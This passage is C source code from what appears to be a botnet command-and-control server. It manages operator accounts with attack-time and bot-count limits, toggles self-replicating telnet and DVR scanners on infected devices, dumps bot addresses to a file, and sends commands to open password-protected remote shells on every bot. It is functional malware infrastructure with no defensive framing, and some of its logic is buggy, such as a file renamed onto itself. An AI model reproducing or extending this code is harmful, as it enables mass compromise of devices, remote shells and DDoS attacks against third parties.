        snprintf(response, sizeof(response), RED "Invalid max time value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), BLUE "Max bots: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int botsidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + botsidx, sizeof(buffer) - 1 - botsidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = botsidx; i < botsidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        botsidx += len;
        if (found) break;
        if (botsidx >= (int)sizeof(buffer) - 1) return;
    }
    buffer[strcspn(buffer, "\r\n")] = 0;
    if (sscanf(buffer, "%d", &maxbots) != 1 || maxbots <= 0) {
        snprintf(response, sizeof(response), RED "Invalid max bots value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    FILE *fp = fopen("database/logins.txt", "a");
    if (!fp) {
        snprintf(response, sizeof(response), RED "Error: Could not open user database\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    
    fprintf(fp, "%s %s %d %d %s\n", newuser, newpass, maxtime, maxbots, is_admin ? "admin" : "0");
    fclose(fp);

    if (user_count < MAX_USERS) {
        strncpy(users[user_count].user, newuser, sizeof(users[user_count].user)-1);
        users[user_count].user[sizeof(users[user_count].user)-1] = 0;
        strncpy(users[user_count].pass, newpass, sizeof(users[user_count].pass)-1);
        users[user_count].pass[sizeof(users[user_count].pass)-1] = 0;
        users[user_count].maxtime = maxtime;
        users[user_count].maxbots = maxbots;
        users[user_count].is_admin = is_admin;
        users[user_count].is_logged_in = 0;
        user_count++;
    }

    snprintf(response, sizeof(response), 
        YELLOW "User added successfully:\r\n"
        "Username: " RED "%s" YELLOW "\r\n"
        "Max time: " RED "%d" YELLOW "\r\n"
        "Max bots: " RED "%d" YELLOW "\r\n"
        "Admin: " RED "%s" YELLOW "\r\n" RESET,
        newuser, maxtime, maxbots, is_admin ? "yes" : "no");
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
}

void handle_removeuser_command(const User *user, const char *command, char *response) {
    FILE *sf = fopen("database/settings.txt", "r");
    char rootuser[50] = {0};
    int is_root = 0;
    
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %49s", rootuser);
                if (strcmp(user->user, rootuser) == 0) {
                    is_root = 1;
                }
                break;
            }
        }
        fclose(sf);
    }

    if (!is_root) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Only root user can remove users\r\n" RESET);
        return;
    }    char target[50];
    if (sscanf(command, "!removeuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !removeuser <username>\r\n" RESET);
        return;
    }

    if (strcmp(target, rootuser) == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Cannot remove root user\r\n" RESET);
        return;
    }

    FILE *f = fopen("database/logins.txt", "r");
    FILE *temp = fopen("database/logins.tmp", "w");
    if (!f || !temp) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Failed to remove user\r\n" RESET);
        if (f) fclose(f);
        if (temp) fclose(temp);
        return;
    }

    char line[256];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char current[50];
        if (sscanf(line, "%49s", current) == 1) {
            if (strcmp(current, target) != 0) {
                fputs(line, temp);
            } else {
                found = 1;
            }
        }
    }

    fclose(f);
    fclose(temp);

    if (found) {
        remove("database/logins.txt");
        rename("database/logins.txt", "database/logins.txt");
        load_users();
        snprintf(response, MAX_COMMAND_LENGTH, GREEN "User %s removed\r\n" RESET, target);
    } else {
        remove("logins.tmp");
        snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
    }
}

void handle_kickuser_command(const User *user, const char *command, char *response) {
    static char target[50];
    static int allow_non_admin;
    static int found;
    
    if (!user->is_admin) {
        FILE *sf = fopen("database/settings.txt", "r");
        allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: You need to be admin or have globalstopall enabled to kick users\r\n" RESET);
            return;
        }
    }

    if (sscanf(command, "!kickuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !kickuser <username>\r\n" RESET);
        return;
    }

    found = 0;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) {
            if (!users[i].is_logged_in) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "User not connected\r\n" RESET);
                return;
            }
            for (int j = 0; j < MAX_USERS; j++) {
                if (user_sockets[j] > 0) {
                    shutdown(user_sockets[j], SHUT_RDWR);
                    close(user_sockets[j]);
                    user_sockets[j] = 0;
                }
            }
            users[i].is_logged_in = 0;
            found = 1;
            break;
        }
    }

    if (found) {
        snprintf(response, MAX_COMMAND_LENGTH, GREEN "Kicked user %s\r\n" RESET, target);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
    }
}

void handle_admin_command(const User *user, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Only admins can use !admin command\r\n" RESET);
        return;
    }
    snprintf(response, MAX_COMMAND_LENGTH,
             CYAN "!adduser" YELLOW " - " RED "Add a new user\r\n"
             CYAN "!selfrep" YELLOW " - " RED "toggle selfreps <telnet|dvr on|off>\r\n"
             CYAN "!botdump" YELLOW " - " RED "Dumps active bots into a file\r\n"
             CYAN "!removeuser" YELLOW " - " RED "Remove a user\r\n"
             CYAN "!kickuser" YELLOW " - " RED "Kick a connected user\r\n"
             CYAN "!openshell" YELLOW " - " RED "Open shell on bot (root only)\r\n" RESET);
}

void handle_ping_command(char *response) {
    int valid_bots = 0;
    pthread_mutex_lock(&bot_mutex);
    int count = bot_count;
    if (count > MAX_BOTS) count = MAX_BOTS;
    for (int i = 0; i < count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
    }
    pthread_mutex_unlock(&bot_mutex);
}


void handle_botdump_command(const User *user, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Admin needed to dump bots\r\n" RESET);
        return;
    }

    FILE *fp = fopen("database/botsdumped.txt", "w");
    if (!fp) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Error: Could not dump bots properly... exiting\r\n" RESET);
        return;
    }

    int dumped = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) {
            struct sockaddr_in addr;
            socklen_t addr_len = sizeof(addr);
            if (getpeername(bots[i].socket, (struct sockaddr*)&addr, &addr_len) == 0) {
                fprintf(fp, "%s:%d:%s\n", 
                    inet_ntoa(addr.sin_addr), 
                    ntohs(addr.sin_port),
                    bots[i].arch ? bots[i].arch : "unknown");
                dumped++;
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    fclose(fp);

    snprintf(response, MAX_COMMAND_LENGTH, GREEN "Successfully dumped %d bots\r\n" RESET, dumped);
}

void handle_selfrep_command(const User *user, const char *command, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Error: only admins can run this command\r\n" RESET);
        return;
    }

    char scanner_type[32];
    char action[32];
    memset(scanner_type, 0, sizeof(scanner_type));
    memset(action, 0, sizeof(action));

    if (sscanf(command, "!selfrep %31s %31s", scanner_type, action) != 2) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Available scanners: telnet|dvr\r\n" RESET);
        return;
    }

    if (strcmp(scanner_type, "telnet") != 0 && strcmp(scanner_type, "dvr") != 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "available scanners: telnet|dvr\r\n" RESET);
        return;
    }

    if (strcmp(action, "on") != 0 && strcmp(action, "off") != 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid option [2]. on|off\r\n" RESET);
        return;
    }

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            send(bots[i].socket, command, strlen(command), MSG_NOSIGNAL);
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, CYAN "Selfrep %s has been toggled %s\r\n" RESET, 
             scanner_type, action);
}

void handle_openshell_command(const User *user, const char *command, int client_socket) {
    char rootuser[64] = {0};
    FILE *sf = fopen("database/settings.txt", "r");
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %63s", rootuser);
                break;
            }
        }
        fclose(sf);
    }
    if (strcmp(user->user, rootuser) != 0) {
        snprintf(response_buf, sizeof(response_buf), GREEN "> " RESET RED "only root-user can use this command\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }
    int port = 0;
    char password[16] = {0};
    if (sscanf(command, "!openshell %d %8s", &port, password) != 2) {
        snprintf(response_buf, sizeof(response_buf), GREEN "> " RESET RED "Usage: !openshell <port> <password> (password max 8 chars)\n" RESET);
    } else if (port < 1 || port > 65535) {
        snprintf(response_buf, sizeof(response_buf), GREEN "> " RESET RED "Invalid port (must be 1-65535)\n" RESET);
    } else if (strlen(password) > 8) {
        snprintf(response_buf, sizeof(response_buf), GREEN "> " RESET RED "Password too long (max 8 chars)\n" RESET);
    } else {
        pthread_mutex_lock(&bot_mutex);
        int sent_bots = 0;
        char bot_command[64];
        snprintf(bot_command, sizeof(bot_command), "!openshell %d %s", port, password);
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
                sent_bots++;
            }
        }
        pthread_mutex_unlock(&bot_mutex);
        FILE *fp = fopen("database/botsdumped.txt", "a");
        if (fp) {
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].is_valid) {
                    struct sockaddr_in addr;
                    socklen_t addr_len = sizeof(addr);
                    if (getpeername(bots[i].socket, (struct sockaddr*)&addr, &addr_len) == 0) {
                        fprintf(fp, "[SHELL-OPENED]-%s:%d:%s\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port), password);
                    }
                }
            }
            fclose(fp);
        }
        snprintf(response_buf, sizeof(response_buf), GREEN "> " RESET GREEN "Attempting to open shell on %d bots... Dumped!\n" RESET, sent_bots);
    }
    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
}

int validate_ip_or_subnet(const char *ip) {
    char buf[32];
    strncpy(buf, ip, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *slash = strchr(buf, '/');
    if (slash) {
        *slash = 0;
        int cidr = atoi(slash+1);
        if (cidr < 1 || cidr > 32) return 0;
    }
    struct in_addr addr;
    return inet_aton(buf, &addr);
}
